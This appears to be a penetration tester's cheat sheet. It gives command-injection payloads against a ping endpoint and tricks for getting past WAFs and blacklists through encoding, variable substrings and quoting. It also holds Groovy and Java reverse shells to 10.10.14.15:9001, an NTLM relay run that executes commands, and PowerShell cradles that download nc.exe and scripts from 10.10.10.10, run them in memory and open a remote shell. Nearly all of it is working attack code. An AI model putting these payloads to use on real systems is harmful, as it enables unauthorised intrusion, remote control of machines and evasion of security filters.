Command Injection# We terminate the previous command and run our command
Check each ; %26 %0a %26%26 || | and see if we can get through
## Run 2 commands regardless curl -s &#34;http://$target/ping?ip=127.0.0.1;id&#34; ## 1st runs on background and runs 2nd curl -s &#34;http://$target/ping?ip=127.0.0.1%26id&#34; ## Run both %0a is newline &#39;\n&#39; curl -s &#34;http://$target/ping?ip=127.0.0.1%0aid&#34; ## Run 2nd if 1st success curl -s &#34;http://$target/ping?ip=127.0.0.1%26%26id&#34; ## Run 2nd if first fail curl -s &#34;http://$target/ping?ip=127.0.||id&#34; ## Pipe curl -s &#34;http://$target/ping?ip=127.0.0.1|id&#34;Blacklisted/WAF bypass# Space %20# Use tab %09, $IFS, and
Braces {ls.-la}, yes it works with sh, on linux
Forward slash /# Use ${PATH:0:1}, ${HOME:0:1}, ${PWD:0:1}
Semi-colon ;# Use ${LS_COLORS:10:1}
Backslash \# Consider %HOMEPATH is \User\www-data, ~6 is starting position, -9 is the negative end position, which is the negative of number of character in username + 1. (Windows is weird)
echo %HOMEPATH:~6,-11%Same command in powershell
$env:HOMEPATH[0] $env:PROGRAMFILES[10]Commands# If WAF is blockinng some commands like whoami, id
Linux sh# ## Quotes doesn&#39;t matter to sh w&#39;h&#39;o&#39;am&#39;i w&#34;h&#34;o&#34;am&#34;i ## idk who$@ami w\ho\am\i ## convert all UPPERCASE to lowercase $(tr &#34;[A-Z]&#34; &#34;[a-z]&#34;&lt;&lt;&lt;&#34;WhOaMi&#34;) $(a=&#34;WhOaMi&#34;;printf %s &#34;${a,,}&#34;) ## Reverse $(rev&lt;&lt;&lt;&#39;imaohw&#39;) $(echo &#39;imaohw&#39; | rev) ## Base64 encoded $(base64 -d&lt;&lt;&lt;d2hvYW1p) $(echo &#39;d2hvYW1p&#39; | base64 -d) bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p) bash&lt;&lt;&lt;$(echo &#39;d2hvYW1p&#39; | base64 -d)Windows# who^ami WhOaMi ## Reverse iex &#34;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&#34;Base64 encoded:
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))or:
echo -n whoami | iconv -t utf-16le | base64Execute:
iex &#34;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&#34;

RCE# Browse to /script
some Groovy code to use:
Linux# Code execution# def cmd = &#39;id&#39; def sout = new StringBuffer(), serr = new StringBuffer() def proc = cmd.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println soutRevshell# nc -nvlp 9001r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.10.14.15/9001;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor()Windows# Code execution# def cmd = &#34;cmd.exe /c dir&#34;.execute(); println(&#34;${cmd.text}&#34;);Revshell# String host=&#34;10.10.14.15&#34;; int port=9001; String cmd=&#34;cmd.exe&#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Recon# nmap -sV -p 873 $targetProbing share dirs# More
nc -nv $target 873rsync -av --list-only rsync://$target/&lt;dir&gt;Retrieve shared files# rsync -av rsync://$target/&lt;dir&gt;More
rsync -av rsync://$target/&lt;dir&gt; -e &#39;ssh -p22&#39;

Used to capture a connection&rsquo;s netNTLM hash and then pass it to another machine.
impacket-ntlmrelayx --no-http-server -smb2support -t $targetBy default, it dumps SAM database, but we can execute a command with -c instead
impacket-ntlmrelayx --no-http-server -smb2support -t $target -c &#39;some revshells&#39;

Convert a payload into base64
echo &#39;calc&#39; | iconv -t utf-16le | base64 -w 0Run hidden powershell base64 payload (super noisy opsec wise)
powershell -WindowStyle Hidden -NonInteractive -exec bypass -enc YwBhAGwAYwAKAA==Download file to a location
(new-object net.webclient).downloadfile(&#34;http://10.10.10.10:80/nc.exe&#34;, &#34;c:\windows\tasks\nc.exe&#34;)Download script and run in memory
powershell -exec bypass -C &#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.10.10:80/script.ps1&#39;)&#34;Cradle
echo &#39;curl http://10.10.10.10:80/nc.exe -o \\windows\\temp\\nc.exe; \\windows\\temp\\nc.exe 10.10.10.10 9001 -e \\windows\\system32\\cmd.exe&#39; &gt; pwn.ps1 echo &#39;IEX (New-Object Net.WebClient).DownloadString(&#34;http://10.10.10.10:80/pwn.ps1&#34;)&#39; | iconv -t utf-16le | base64 -w 0powershell -WindowStyle Hidden -NonInteractive -exec bypass -enc &lt;payload&gt;
